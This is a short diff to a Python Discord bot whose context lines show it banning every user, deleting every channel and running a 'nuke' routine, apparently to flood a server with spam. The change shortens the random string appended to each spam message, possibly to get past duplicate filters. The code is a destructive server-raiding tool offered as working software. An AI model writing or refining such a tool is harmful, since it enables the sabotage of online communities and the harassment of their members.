@@ -98,7 +98,7 @@ class DiscordBot(commands.Bot):
             await self.banAllUser(self.guild)
         if self.allChannelDelete:
             await self.deleteAllChannel(self.guild)
-        message = self.message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(12))
+        message = self.message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(7))
         await self.nuke(self.nukeLatency, message, self.guild, self.channelName)
     async def on_message(self, message):
         if message.author.bot:
